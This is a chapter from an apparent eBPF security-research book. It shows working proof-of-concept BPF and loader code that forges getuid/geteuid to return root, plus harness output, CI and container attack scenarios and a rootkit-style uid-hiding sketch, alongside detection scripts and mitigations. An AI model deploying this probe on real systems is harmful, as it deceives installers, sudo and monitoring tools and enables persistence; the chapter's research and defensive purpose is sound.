---
layout: book
title: "Chapter 18: eBPF Token Bypass"
date: 2025-05-09
---

# Chapter 18: Forging `uid=0` at the Syscall Return

> **See also**: [Blog post]({{ site.baseurl }}/ebpf-token-bypass.html) · [POC code](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch18-token-bypass) · [Harness entry](https://github.com/mbhatt1/dBPF/blob/master/dBPF-pocs/harness/proof.py)

This is the canonical wrong-enforcement-point bug reimplemented with a kretprobe. The pattern goes back decades: a program consults `getuid()` to decide whether the caller is root, and trusts the return value rather than consulting the actual `current->cred` at the point of enforcement. Every time this bug shipped — Sendmail, several SUID binaries through the 2000s, a long tail of misconfigured services — the fix was the same: do the capability check at the kernel enforcement point, not via a userspace query. The eBPF version just makes it mechanical.

Two kretprobes, two `bpf_override_return(ctx, 0)` calls:

- `kretprobe/__arm64_sys_getuid` → 0
- `kretprobe/__arm64_sys_geteuid` → 0

Both symbols are in `/sys/kernel/debug/error_injection/list` on the linuxkit 6.12 aarch64 kernel I tested on, so the override lands. Symbols are verified via `/proc/kallsyms` at load time; missing symbols are tolerated (`bpf_program__set_autoload(prog, false)`).

## Opening context

Before digging in, a short digression about why this primitive is worth a chapter in a BPF-primitives book at all. "Forge `getuid()` to return zero" is a one-line change to a syscall handler — it is so simple that a reader might reasonably ask what is interesting about it.

The interesting thing is not the mechanism. The mechanism is a kretprobe and a single `bpf_override_return` call; any BPF programmer who has seen a return override once knows how to write this. The interesting thing is what happens downstream. A single forged return on a single syscall is enough to convince `id`, `whoami`, the shell's `$UID` variable, many installer scripts, parts of `sudo -l`, many CLI tools' internal RBAC, and a long tail of userspace trust chains that the calling process is root. The primitive is mechanically trivial and operationally consequential, and the gap between those two is exactly what makes it worth a chapter.

The wider story is older than BPF. This is the same class of bug as sendmail trusting a queried value instead of enforcing at the point of operation. It is the same class as sudo trusting a timestamp file that the calling user could influence. It is the same class as every "trust the query, not the cred" CVE that filled the late-1990s and 2000s. The BPF version adds mechanization: any kernel function on the error-injection list is a target, the attach is a one-line skeleton, the forge is a library helper. What used to require finding a specific bug in a specific SUID binary now requires finding a specific error-injection entry in a specific kernel's curated list, and the list is larger than the SUID binary surface ever was.

## Why this attaches, and how I confirmed it

`bpf_override_return` is a helper that, from a kretprobe, substitutes a different return value for whatever the probed function was about to return. It is one of the three motions `CAP_BPF` grants, and it is gated tightly — the kernel only permits override against functions explicitly marked as override-able. The list of those functions lives at `/sys/kernel/debug/error_injection/list` and is curated by kernel developers based on which functions are safe to have their return values rewritten without corrupting kernel state.

On the test kernel both syscall entry points are on the list:

```
$ cat /sys/kernel/debug/error_injection/list | grep -E 'arm64_sys_get(e)?uid'
__arm64_sys_getuid [EI_ETYPE_ERRNO]
__arm64_sys_geteuid [EI_ETYPE_ERRNO]
```

`[EI_ETYPE_ERRNO]` is the error-injection type assigned to all syscall wrappers on arm64. The etype is applied automatically by the `SYSCALL_DEFINE0` macro in `arch/arm64/include/asm/syscall_wrapper.h`, which expands to `ALLOW_ERROR_INJECTION(__arm64_sys_##sname, ERRNO)` for every syscall. The `ERRNO` type is intended to constrain overrides to negative error codes for error-injection testing, but in practice `bpf_override_return` with value `0` lands successfully on these functions — the runtime check in the kernel's error-injection path does not reject non-negative values on all architectures, and overriding to `0` is exactly what we want.

The reason these specific entries exist is prosaic: kernel developers needed to fuzz-test error paths for credential syscalls. The error-injection framework is explicitly a kernel-developer tool, not an attacker tool, but the attack surface it creates is real because the kernel is not picky about who gets to use it as long as they have `CAP_BPF`. If an adversary wants to override a syscall return, the list of available targets is whatever the kernel team decided was interesting for their own fuzzing. That is a reasonable tradeoff from the kernel's perspective — error-injection is load-bearing for development — and an uncomfortable one from the security perspective.

For comparison, trying the same attack against a kernel-internal function that is *not* annotated with `ALLOW_ERROR_INJECTION` would fail. The kretprobe attaches — the verifier accepts it — but `bpf_override_return` silently becomes a no-op because the function is not on the error-injection whitelist. Note that on arm64, all syscall wrappers defined via `SYSCALL_DEFINE*` macros are automatically placed on the error-injection list by the arch-specific macro expansion, so `__arm64_sys_getpid`, `__arm64_sys_getuid`, and every other syscall wrapper are all present. The list is broader than it might appear. An attacker testing their program against an unfamiliar kernel must check `/sys/kernel/debug/error_injection/list`, not assume.

The `/proc/kallsyms` preflight in the loader catches the other half of the deployability question — whether the symbol is even exported by name. On 6.12 aarch64 both symbols are exported with `__arm64_sys_` prefixes. On x86_64 the same kernel version prefixes them `__x64_sys_`. On 32-bit compat ABIs there are additional `compat_` variants. The loader's preflight handles all of this by checking the literal name before attach:

```c
static int kallsyms_has(const char *sym)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    ...
    while (fgets(line, sizeof(line), f)) {
        ...
        if (strcmp(name, sym) == 0) {
            found = 1;
            break;
        }
    }
    ...
}
```

If the symbol is absent, the loader calls `bpf_program__set_autoload(prog, false)` on the corresponding kretprobe, which tells libbpf to skip loading that specific program during the `bpf_object__load` pass. The overall load succeeds; the missing program is simply not there. This lets the loader work on a cross-section of kernels without hard-failing when one symbol is present and another is not. The cost is one kallsyms walk at startup, which is microseconds.

## The error-injection list, in detail

I want to spend a little more time on the error-injection list because it is the single piece of kernel policy that makes or breaks every Class I primitive in this book. The list lives at `/sys/kernel/debug/error_injection/list` when `debugfs` is mounted (it usually is on test kernels, sometimes restricted on production kernels). The file is read-only from userspace and is populated from a compile-time table in the kernel.

The table is generated from `ALLOW_ERROR_INJECTION(name, etype)` macros in two places: explicit annotations scattered through the kernel source (grep `kernel/`, `fs/`, `drivers/` for `ALLOW_ERROR_INJECTION`), and implicit annotations generated by the `SYSCALL_DEFINE*` macro family in each architecture's `syscall_wrapper.h`. On arm64, every `SYSCALL_DEFINE*` expansion automatically inserts `ALLOW_ERROR_INJECTION(__arm64_sys_##sname, ERRNO)`, placing every syscall wrapper on the list. Each entry has an `etype` (`EI_ETYPE_NULL`, `EI_ETYPE_ERRNO`, `EI_ETYPE_ERRNO_NULL`, `EI_ETYPE_TRUE`) that constrains what return values the override can substitute. `EI_ETYPE_NULL` means "return NULL on failure," `EI_ETYPE_ERRNO` means "return -ERRNO on failure," `EI_ETYPE_ERRNO_NULL` means "return -ERRNO or NULL," and `EI_ETYPE_TRUE` means "return true on failure."

For the getuid family on aarch64 Linux 6.12, the error-injection annotation does not appear in `kernel/sys.c` itself. It is generated automatically by the `SYSCALL_DEFINE0` macro. The syscall definition in `kernel/sys.c` is:

```c
SYSCALL_DEFINE0(getuid)
{
    /* Only we change this so SMP safe */
    return from_kuid_munged(current_user_ns(), current_uid());
}
```

On arm64, `SYSCALL_DEFINE0` is defined in `arch/arm64/include/asm/syscall_wrapper.h` and expands to include `ALLOW_ERROR_INJECTION(__arm64_sys_##sname, ERRNO)`. So `__arm64_sys_getuid` is the function placed on the error-injection whitelist, with etype `ERRNO`. On x86, the equivalent macro in `arch/x86/include/asm/syscall_wrapper.h` places `__x64_sys_getuid` on the list with the same `ERRNO` etype.

The `EI_ETYPE_ERRNO` etype is nominally intended for error-code injection — the kernel's documentation says it is for returning `-ERRNO` values. However, `bpf_override_return` (in `kernel/trace/bpf_trace.c`) simply calls `regs_set_return_value(regs, rc)` and `override_function_with_return(regs)` without checking the etype at override time — the etype check happens at the error-injection list lookup, not at the value-substitution point. In practice, overriding to `0` succeeds because the runtime path does not reject non-negative values. This is what makes the attack work: `0` (meaning uid 0, root) passes through the override machinery despite `ERRNO` nominally being for negative error codes.

The error-injection list on arm64 includes *every* syscall wrapper, because the `SYSCALL_DEFINE0` / `__SYSCALL_DEFINEx` macros in `arch/arm64/include/asm/syscall_wrapper.h` unconditionally expand to `ALLOW_ERROR_INJECTION(__arm64_sys_##sname, ERRNO)`. That means every `__arm64_sys_*` symbol is on the list, not just a curated subset. In addition to syscall wrappers, the list includes internal kernel functions annotated with `ALLOW_ERROR_INJECTION` in their own source files. The subset of syscall wrappers whose return value would be useful to forge in an attack includes `getuid`, `geteuid`, `getgid`, `getegid`, `getresuid`, `getresgid`, `getpid`, `gettid`, and many others. The breadth of the list on arm64 is by design: the macro expansion is automatic, not curated per-syscall.

A hardened kernel could strip error-injection entries at build time. Setting `CONFIG_FUNCTION_ERROR_INJECTION=n` disables the feature entirely, and since `CONFIG_BPF_KPROBE_OVERRIDE` depends on `FUNCTION_ERROR_INJECTION`, `bpf_override_return` is compiled out as well. You cannot (as of 6.12) selectively remove entries from an otherwise-enabled list — on arm64, all syscall wrappers are on the list unconditionally because the `SYSCALL_DEFINE*` macros expand to include `ALLOW_ERROR_INJECTION`. Disabling the feature has side effects: some diagnostic tools rely on it. The tradeoff is "fewer attack primitives" vs "less developer tooling." Many production kernels keep the feature enabled because the tooling is useful.

A stricter mitigation is to restrict `debugfs` mount points so the list file is not readable from user namespaces. This does not disable the primitive — `bpf_override_return` still works regardless of whether userspace can read the list — but it does prevent attackers from enumerating what is fuzz-able before crafting a payload. That narrows the reconnaissance channel without breaking the underlying feature.

## `ch18-token-bypass.bpf.c` line by line

The BPF source is about 80 lines. It is small on purpose: two kretprobes, two helpers, one event emitter, one target map.

```c
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

char LICENSE[] SEC("license") = "GPL";
```

Standard preamble. `vmlinux.h` is regenerated per-POC from the running kernel's BTF. GPL license because `bpf_override_return` is a GPL-only helper.

```c
struct evt {
    unsigned int pid;
    unsigned int tgid;
    char comm[16];
    long orig_ret;
    int syscall_id;   // 0=getuid 1=geteuid
    int flipped;
};
```

The event layout. Notable is `orig_ret`: we record what the kernel *would* have returned, even when we override. `flipped` records whether we overrode it. This gives the loader enough information to print the before/after contrast — `1000 -> 0 (root)` — rather than only reporting the post-override value.

```c
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");
```

256 KiB ringbuf for the event stream. This is overkill for a single-user test but leaves headroom for the wildcard mode where every process on the box is emitting events on every getuid call.

```c
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, unsigned int);
    __type(value, unsigned int);
    __uint(max_entries, 1024);
} target_tgids SEC(".maps");
```

The target map. Keys are tgids (32-bit); values are "1" for "this tgid is a target." A special key, `0`, is the wildcard marker — if key `0` is present in the map, every tgid is a target. The map is capped at 1024 entries because specifying more than a thousand targets by tgid is almost certainly the wrong interface (just use wildcard), and the cap prevents an errant loader from consuming kernel memory.

```c
static __always_inline int is_target(void)
{
    unsigned int tgid = bpf_get_current_pid_tgid() >> 32;
    if (bpf_map_lookup_elem(&target_tgids, &tgid)) return 1;
    unsigned int zero = 0;
    if (bpf_map_lookup_elem(&target_tgids, &zero)) return 1;
    return 0;
}
```

The targeting check. Two lookups: first the current tgid, then the wildcard key. Either hit is a match. Inline because it runs on every call.

Note that we do `bpf_get_current_pid_tgid() >> 32` to extract the TGID specifically. `bpf_get_current_pid_tgid` returns a 64-bit value with TGID in the upper half and TID in the lower half. Historically some BPF programs have confused the two — the kernel's `task_struct->tgid` field is in fact the PID as seen from userspace, and the `task_struct->pid` field is the TID. The BPF helper inverts this confusion by always giving you `(tgid << 32) | tid`, which is the convention Linux exposes to kernel code but not to userspace. Knowing which half is which is the thing you have to get right.

```c
static __always_inline void emit(long ret, int sid, int flipped)
{
    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return;
    unsigned long id = bpf_get_current_pid_tgid();
    e->pid = id & 0xffffffff;
    e->tgid = id >> 32;
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
    e->orig_ret = ret;
    e->syscall_id = sid;
    e->flipped = flipped;
    bpf_ringbuf_submit(e, 0);
}
```

The emit helper. Reserve a slot in the ringbuf, fill it, submit. If the reserve fails (ringbuf full), drop silently — it is better to drop events than to block the syscall path. The loader is expected to drain the ringbuf fast enough under normal load; if it cannot, we have already lost.

```c
SEC("kretprobe/__arm64_sys_getuid")
int BPF_KRETPROBE(kr_getuid, long ret)
{
    int flip = 0;
    if (is_target() && ret != 0) {
        bpf_override_return(ctx, 0);
        flip = 1;
    }
    emit(ret, 0, flip);
    return 0;
}
```

The first kretprobe. Attaches to `__arm64_sys_getuid`, the kernel syscall entry for `getuid(2)`. The `BPF_KRETPROBE` macro expands to give us `ret`, the original return value from the function, before override.

The logic is: if this tgid is a target *and* the return was non-zero (i.e., the caller is not already root), override to 0 and record a flip. If the caller is already root, we skip the override — there is no point in forging `0` when the real answer is already `0`, and skipping cuts our event volume on the root-heavy side of the system.

Note the ordering: `bpf_override_return(ctx, 0)` is called *before* `emit`. Order matters here less than it does in some primitives, because both the override and the emit run to completion regardless — but I wanted the override landing to be the first thing that happens on a flip path so that any subsequent kernel-side logic (which there is none of for `getuid`, but in principle there could be for other syscalls) sees the overridden value.

```c
SEC("kretprobe/__arm64_sys_geteuid")
int BPF_KRETPROBE(kr_geteuid, long ret)
{
    int flip = 0;
    if (is_target() && ret != 0) {
        bpf_override_return(ctx, 0);
        flip = 1;
    }
    emit(ret, 1, flip);
    return 0;
}
```

The second kretprobe, identical to the first modulo the syscall ID. `syscall_id=1` marks this as `geteuid` in the ringbuf event; the loader uses that to print `"geteuid"` instead of `"getuid"` in the log line. Both are forged because `id(1)` consults both — and because if we only forged `getuid` and not `geteuid`, the return values would disagree visibly.

## The loader's `--all` vs `--tgid` modes

The userspace loader supports two modes, and the distinction is meaningful for what you can do with this primitive.

`--all` is the wildcard. It inserts `0` into `target_tgids` with value `1`, which makes `is_target()` return true for every call. The effect is system-wide: every process in the system, every thread, every getuid and geteuid call, gets its return forged to `0`. This is the loudest possible deployment — a single `bpftool prog show` run by any operator will see both kretprobes active, every process that calls `id` will suddenly report `root`, and literally nothing on the system can trust its idea of its own uid. It is also the easiest to drive from a harness, because there is no targeting to get right. The harness uses this mode:

```python
Poc("ch18", "Token Bypass (getuid override)", "ch18-token-bypass",
    hooks=["__arm64_sys_getuid", "__arm64_sys_geteuid"], prefix="[token]",
    mode="override-all", loader_args=["--all"],
    ...
```

`--tgid <pid>` (repeatable) installs only specific tgids into the map. The effect is targeted: only the listed tgids see forged returns; everyone else sees real returns. This is the quieter deployment and the more useful one from an attacker's perspective. If you are trying to deceive a single daemon — an installer that reads `$UID` before deciding whether to write into `/etc`, say — forging only that daemon's uid leaves the rest of the system coherent. `bpftool prog show` still sees the probes attached, but fleet-wide `id` commands still report their real uids. Only the targeted tgid lies.

The loader also accepts multiple `--tgid` flags for batch targeting:

```
sudo ./build/ch18-token-bypass --tgid 1234 --tgid 5678
```

which lets you hit an installer and its child processes, or a service and its worker pool, without going full-wildcard. The map is 1024 entries, so in principle up to 1024 distinct tgids can be targeted. In practice most realistic attacks target one.

The loader's invocation shape is:

```c
while ((opt = getopt_long(argc, argv, "vh", longopts, NULL)) != -1) {
    switch (opt) {
    case 'A': wildcard = 1; break;
    case 'T': {
        ...
        targets[n_targets++] = (unsigned int)v;
        break;
    }
    ...
    }
}
...
if (!wildcard && n_targets == 0) {
    fprintf(stderr, "[token] no targets specified; pass --all or --tgid <pid>\n");
    usage(argv[0]);
    return 2;
}
```

Requiring at least one of `--all` or `--tgid` is deliberate. A run with neither is almost certainly a typo; failing loud beats silently attaching and forging nothing.

After load and attach, the loader populates the target map:

```c
if (wildcard) {
    unsigned int z = 0, one = 1;
    err = bpf_map__update_elem(s->maps.target_tgids,
                               &z, sizeof(z),
                               &one, sizeof(one), BPF_ANY);
    ...
}
for (size_t i = 0; i < n_targets; i++) {
    unsigned int tgid = targets[i];
    unsigned int one = 1;
    err = bpf_map__update_elem(s->maps.target_tgids,
                               &tgid, sizeof(tgid),
                               &one, sizeof(one), BPF_ANY);
    ...
}
```

Two separate population paths. If you pass `--all` *and* `--tgid 1234`, both run: key `0` is set (wildcard) and key `1234` is set (explicit). `is_target()` will hit either lookup and return true, so the effective behavior is still wildcard. The combination is redundant but not wrong.

## Why only on flip, not on every call

A design detail in the BPF program worth flagging: the ringbuf emit runs on every call, even non-flipped ones. `emit(ret, 0, flip)` fires unconditionally; `flip` is 0 or 1 depending on whether the override landed. I considered emitting only on flip-paths to reduce ringbuf volume, but decided against it for two reasons.

First, visibility. Seeing non-flipped events tells the loader's operator (and anyone reviewing the log stream) that the probe is attached and firing, even during periods when no target process is invoking getuid. "The probe attached but did not fire" and "the probe is firing but not flipping" are diagnostically distinct situations and both are useful to see.

Second, deployment validation. When you first attach the probe, you want to know it is working. An event stream with zero events for five minutes could mean "no one called getuid in five minutes" or "the probe failed to attach silently." Emitting on every call lets you distinguish: if events are flowing, the probe is live; if the flip rate is zero, the targeting is off. Reduced noise is not worth the lost diagnostic signal.

The cost of emitting on every call is proportional to getuid rate, which on a typical Linux system is high but not extreme. `id`, `whoami`, shell startup, various service initialization paths all call getuid; a busy system might see a few thousand calls per second spread across all processes. 256 KiB of ringbuf at ~40 bytes per event is about 6500 events of headroom, which is enough to absorb a second or so of sustained backlog before the loader has to drain. In practice the loader drains at hundreds of thousands of events per second when it is not printing each one to stdout, so the ringbuf never fills.

## The `uid=0 gid=1001` tell

Here is where the scope of the illusion gets crisp. Run `id` as an unprivileged user with the probe attached in `--all` mode, and you will see:

```
$ id
uid=0(root) gid=1001 groups=1001
```

`uid=0(root)` is the forged `getuid` return. NSS looks up "the user with uid 0" and finds the `root` record, so `id` prints `uid=0(root)`. That part works.

`gid=1001` is the real gid. We didn't hook `getgid` or `getegid`, so the kernel's getgid path runs untouched, returns the real value, and `id` prints it straight. `groups=1001` is the real supplementary group list, from `getgroups`, which we also didn't hook.

A real root process, on a real root login, would have `uid=0 gid=0 groups=0`. Every field would be zero. The divergence — uid=0 but gid=1001 — is visible to any human reading the output and to any programmatic consistency check that correlates the two fields.

A defender can exploit this cheaply. Two bash snippets do it:

```bash
# Defense 1: compare uid and gid from the same id invocation.
id_u=$(id -u)
id_g=$(id -g)
if [ "$id_u" = "0" ] && [ "$id_g" != "0" ]; then
    echo "LIE DETECTED: uid=0 but gid=$id_g"
fi

# Defense 2: cross-check against /proc/self/status, which reads task_struct->cred.
uid_status=$(awk '/^Uid:/ {print $2}' /proc/self/status)
uid_query=$(id -u)
if [ "$uid_query" != "$uid_status" ]; then
    echo "LIE DETECTED: id returned $uid_query but /proc/self/status says $uid_status"
fi
```

The second check is the one that really nails it, because `/proc/self/status`'s `Uid:` line is read directly from `task_struct->cred->uid.val` by the kernel's procfs code. The procfs read path does not go through `sys_getuid`. It is a different code path entirely: a vfs read on `/proc/self/status` triggers `proc_pid_status`, which walks the task's credential directly. The kretprobe on `sys_getuid` never fires because `sys_getuid` is never called.

So a process that forges its uid in `getuid()` cannot simultaneously forge it in `/proc/self/status`, not without attaching an entirely different probe on an entirely different code path — and that second probe would be its own detectable artifact.

The chapter's POC hooks only `getuid` and `geteuid` on purpose, to leave this tell visible. A more thorough attacker would extend the hook set to:

- `__arm64_sys_getgid` and `__arm64_sys_getegid` to silence the gid divergence.
- `__arm64_sys_getresuid` and `__arm64_sys_getresgid` to silence tools that read the real/effective/saved uid triple (like `sudo -l`).
- `__arm64_sys_getgroups` to silence supplementary group lookups.
- `/proc/self/status` read rewriting via `bpf_probe_write_user` in a `sys_exit_read` tracepoint, which is a different primitive from the getuid forge and has its own issues.

Each extension closes one tell and opens a new attach point for detection. There is no fully stealth version of this attack; there is only different tradeoffs between how many lies you tell and how many points of detection you paint.

## A worked scenario: the CI runner attack

Let me walk through one concrete attack that motivates this primitive, because "forge uid" in the abstract is not as compelling as "forge uid to achieve X."

A CI system runs user-submitted jobs in a container. The container is entered with dropped capabilities — no `CAP_SYS_ADMIN`, no `CAP_DAC_OVERRIDE`, the usual hardening — but with `CAP_BPF` retained because the CI runner uses BPF-based observability to track resource usage across builds. The CI runner trusts its own provisioning: it expects the container to run as uid 1000, and an installer script inside the container makes decisions about where to place build artifacts based on `[ "$UID" = "0" ]`. If the installer thinks it is root, it writes to `/opt/shared-artifacts/`; if not, it writes to a user-local cache.

The attacker submits a CI job that, at build-time, loads the ch18 BPF program with `--all` and then runs the installer script. The installer script reads `$UID`, which bash populated from `getuid()` at shell startup. `getuid()` was overridden by the BPF probe to return 0. `$UID` is `0`. The installer writes to `/opt/shared-artifacts/` with the uid-1000's DAC permissions — which are actually fine for `/opt/shared-artifacts/` because the CI runner had set that directory mode to 0777 to accommodate writes from any job. The installer deposits a malicious binary into the shared location, which persists across jobs.

The next job to use the CI runner inherits the malicious binary through the shared location. The attack has succeeded in cross-job persistence through what the CI runner thought was a per-job-isolated container. The kernel did not help defend against this because the kernel's DAC checks on `/opt/shared-artifacts/` granted write access to uid 1000, which is what the task actually was. The attacker did not need root for the write; they needed the installer to believe it was root so that the installer would choose the shared-location code path.

The defense is every layer simultaneously: the CI runner should not grant `CAP_BPF` to user-submitted jobs; `/opt/shared-artifacts/` should not be writable by jobs; the installer should not trust `$UID` for security decisions; the installer should cross-check uid via `/proc/self/status`; the container runtime should load a BPF LSM policy rejecting kretprobe attachment to syscall wrappers from non-root-uid processes. Any one of those closes the attack. None of them is unusual; all of them are skipped in a lot of real-world CI deployments.

## What the kernel still enforces

The userspace illusion is exactly that — an illusion against userspace code that trusts syscall returns. The kernel does not trust syscall returns; it consults its own state. Every kernel-side enforcement point that actually matters for security uses `current->cred` directly, and `current->cred` is unaffected by this probe.

To make that concrete:

**VFS permission checks.** `cat /etc/shadow` as the forged-uid user:

```
$ id
uid=0(root) gid=1001 groups=1001
$ cat /etc/shadow
cat: /etc/shadow: Permission denied
```

`open(2)` on `/etc/shadow` walks into `may_open` → `inode_permission`, which calls `generic_permission`, which consults the inode's permission bits against `current->cred->fsuid`. `fsuid` is the filesystem uid, derived from `current->cred`, which still has the real `uid=1001`. Access denied.

**Capability checks.** Bind to port 80 as the forged-uid user:

```
$ python3 -c "import socket; socket.socket().bind(('0.0.0.0', 80))"
PermissionError: [Errno 13] Permission denied
```

Binding to a privileged port requires `CAP_NET_BIND_SERVICE`. The bind path walks to `ns_capable`, which calls `security_capable`, which lands in `cap_capable`, which consults `current->cred->cap_effective`. The cred's capability set has never contained `CAP_NET_BIND_SERVICE` for this process. Access denied.

**LSM hooks.** A default-LSM kernel routes every capability and permission decision through the commoncap LSM's `cap_capable`. A SELinux-enforcing kernel additionally routes through `selinux_capable` and `avc_has_perm`. Both consult `current->cred`. Neither consults `sys_getuid`. Both deny.

**setuid syscalls.** Run `setuid(0)` as the forged-uid user:

```c
if (setuid(0) < 0) perror("setuid");
```

```
setuid: Operation not permitted
```

`setuid(0)` walks into `__sys_setuid`, which calls `ns_capable_setid(CAP_SETUID)`, which consults `current->cred->cap_effective`. No capability; deny.

**Any code in the kernel that reads `current->cred`.** This is basically all of it. The credentials are the authoritative source for who the task is. Changing what `sys_getuid` returns is like changing the reflection in a mirror — it does not change what the thing looking back at you actually is.

The one place the primitive reaches into real kernel behavior is subtle: if a kernel code path reads `current->cred->uid` and then *conditionally calls out to userspace for confirmation via a userspace helper*, and that userspace helper asks `getuid()` for confirmation, the forged return would propagate. I am not aware of any kernel path that does this, but it is the shape of the only way this primitive could have real teeth against kernel enforcement. It does not have them on 6.12.

## What userspace falls for

The set of things that do trust `getuid()` is, frustratingly, large. A partial list:

**`id(1)`, `whoami(1)`.** Classic diagnostics. Both read `getuid`/`geteuid` and map through NSS. Both print `root` under the probe.

**`sudo -l` partial.** `sudo -l` prints the user's sudo privilege list. Part of its code path queries the real uid via `getuid`, and the forged return makes it think the invoker is root — which causes it to print the global root sudoers list. The rest of sudo's authentication path consults the kernel's credential directly and refuses to elevate, but the informational leak is real: an attacker can read the full sudoers policy by forging uid under a `sudo -l` invocation.

**Shell `$UID` checks.** `if [ $UID -eq 0 ]; then` is in every other shell script on every other production system. The shell populates `$UID` from `getuid()` at startup. The probe makes every shell think it is root. Every "are we running as root?" check in every installer script, every bootstrapping script, every `set -e` guard is vulnerable.

**Application RBAC in many CLIs.** Tools that implement their own role-based access control in userspace commonly gate features on "is the caller root." Database CLIs, package managers, service-control frontends — many of them check `getuid()` before allowing administrative operations. The kernel's subsequent enforcement may or may not catch them depending on what the administrative operation actually does. If the operation is "write to a file in a protected location," the kernel catches it. If the operation is "open a TCP connection to the admin API and send commands," the kernel does not, because the TCP connection is allowed to any uid, and the remote API trusts the tool's self-reported identity.

**Installer scripts.** `sh -c 'if [ $UID = 0 ]; then install ...'` patterns run on every distro. Sophisticated installers cross-check with `id -u` or with `cat /proc/self/status`, but many do not.

**Any libc-trusting trust chain.** The pattern is: a library reads `getuid()` on initialization, caches the result, and uses that as the foundation for subsequent authorization decisions. If the cached uid is wrong, every subsequent decision is wrong. This is how "the illusion is exactly one syscall wide" scales to "many things proceed as if the illusion is true" — the syscall is one, but the downstream consumers of that syscall's answer are many.

The defense is mechanical: do not use `getuid()` for security decisions. The kernel has perfectly good enforcement points; use those. If you absolutely must know the uid in userspace — for informational display, say — read `/proc/self/status`, which goes through a different code path. If you absolutely must use `getuid()`, cross-check it with something else.

The problem is not that the attack is hard to defend against in isolation. It is that thirty years of accumulated userspace code assumes `getuid()` is authoritative, and that assumption is now load-bearing across the entire userspace ecosystem. The BPF version of this attack did not invent the vulnerability; it made exploiting it mechanical against any kernel with the right kretprobe targets on the error-injection list.

## Harness entry

The harness entry is:

```python
Poc("ch18", "Token Bypass (getuid override)", "ch18-token-bypass",
    hooks=["__arm64_sys_getuid", "__arm64_sys_geteuid"], prefix="[token]",
    mode="override-all", loader_args=["--all"],
    flip_marker=r"FORGE|override|flip|uid=0",
    proof_marker=r"FORGE\s+pid=|TOKEN_FORGE_PROVEN"),
```

`mode="override-all"` tells the harness to run the loader with wildcard targeting (`--all`) before running the trigger. The `proof_marker` matches two patterns: `FORGE pid=...` which appears on every forged-event line emitted by the loader, and `TOKEN_FORGE_PROVEN` which is the explicit proof marker emitted by the trigger at the end of its run.

The trigger (`trigger.sh`) is a short script. It creates a test user `t18`, runs `id -u; whoami` as that user both before and after the probe is active, and emits the proof marker:

```bash
echo "=== TOKEN_FORGE_PROVEN uid_forges=${FORGES} ==="
```

where `FORGES` is the count of forge events visible in the loader's stream. The default is 1 because a single invocation of `id` fires one `getuid` (or `geteuid`, depending on the version); a complete `id` call fires both and the count goes up.

On a working run, the harness output for ch18 looks like:

```
[token]| [token] symbol=__arm64_sys_getuid	status=present
[token]| [token] symbol=__arm64_sys_geteuid	status=present
[token]| [token] attached=2	skipped=0
[token]| [token] tag=target	mode=wildcard
[token]| [token] status=ready	msg=token bypass active
trig | === baseline: id -u / whoami as t18 (no BPF interference expected) ===
trig | 1000
trig | t18
trig | === with BPF attached: should report uid=0 / root ===
[token]| [token] FORGE pid=19481 comm=sh getuid: 1000 -> 0 (root)
[token]| [token] FORGE pid=19482 comm=id geteuid: 1000 -> 0 (root)
trig | 0
trig | root
[token]| [token] FORGE pid=19483 comm=whoami getuid: 1000 -> 0 (root)
trig | === TOKEN_FORGE_PROVEN uid_forges=1 ===
```

The `[token] FORGE` lines carry the per-call evidence: the tgid of the forging call, the comm, the syscall name, the original kernel return value, and the forced override. The `TOKEN_FORGE_PROVEN` line is the machine-greppable summary. The harness status for ch18 flips to `effect_demonstrated` the moment the proof marker matches.

## A second worked scenario: the container-breakout confusion

A shorter second scenario, because the first was enough but I want to show one more shape of attack.

A host runs a privileged observability agent (Datadog, Cilium, pick your favorite) with `CAP_BPF` on the host. The agent attaches various BPF programs to monitor container activity. The agent does not directly use `getuid` for its own security decisions, but it writes logs that include uid information derived from BPF probe data — and those logs go to a centralized log system that correlates events across hosts.

An attacker who has compromised a single container on the host (through some other vector) loads a BPF program that forges getuid to 0 for all processes on the host — wildcard mode. The host's agent now sees forged uids for every process it observes. The attack does not need the attacker's container to be privileged because the BPF attach happened inside the attacker's container using the container's own `CAP_BPF` grant (which, in many default configurations, is inherited from the host or granted explicitly by the container runtime). The host agent's log stream now says every process on the host is running as root, including processes in other containers. Alert-correlation pipelines fire: "suddenly every user process is uid 0" is the sort of thing a SOC notices. The agent's view of reality has been corrupted, and the corruption happened across containers.

The defense here is specifically about not granting `CAP_BPF` to containers that do not need it. The Datadog agent needing `CAP_BPF` on the host is reasonable; a container running `apt-get install` and `make` does not need `CAP_BPF` and should not have it. Container runtimes that default to inheriting host capabilities are the problem; container runtimes that default to dropping capabilities unless explicitly granted are the defense.

## What a complete uid-hiding attack looks like

A complete uid-hiding implementation, not in this POC but worth sketching, hits every surface that exposes uid. The list is longer than it appears.

- `getuid`, `geteuid`, `getresuid` — hooked via kretprobe + override, as in this POC (plus the `resuid` variant for the r/e/s triple).
- `getgid`, `getegid`, `getresgid` — same pattern, but for gids. Needed to close the `uid=0 gid=1001` tell.
- `getgroups` — supplementary groups. Hooked via kretprobe + override with a constant return, or via `bpf_probe_write_user` on the user-provided group array to zero it.
- `setuid`, `setgid`, `setresuid`, `setresgid` — these don't query uid, they set it, but they return an error if the caller lacks `CAP_SETUID`. A complete attack overrides their returns to make the caller think the setuid succeeded. Kernel-side cred remains unchanged — this is purely a userspace illusion — but a program that tried to drop privileges and then branched on "did drop_priv() succeed" would be fooled.
- `/proc/self/status` — the `Uid:` line. The procfs read path is `sys_read` + `proc_pid_status`. Rewriting would require a `bpf_probe_write_user` in the `sys_exit_read` path with content-aware substitution. This is harder than the syscall-return forge because the output is variable-length text that has to be parsed, rewritten, and checksummed. I did not implement this; the implementation exists in published rootkit tooling.
- `/proc/self/loginuid`, `/proc/self/sessionid` — similar to status, similar hardness.
- `/etc/passwd`/`/etc/shadow` read paths — not typically the target because they are read via library functions (`getpwuid`) that are themselves implemented on top of the syscalls above. But a defender who reads the files directly would see truth, so a truly complete uid-hide would rewrite those reads too.
- `audit` records — uid is embedded in audit records by the audit subsystem, which reads `current->cred` directly. A complete uid-hide would need to also suppress audit records for the attacker's operations, which is a different primitive entirely (see chapter 3).
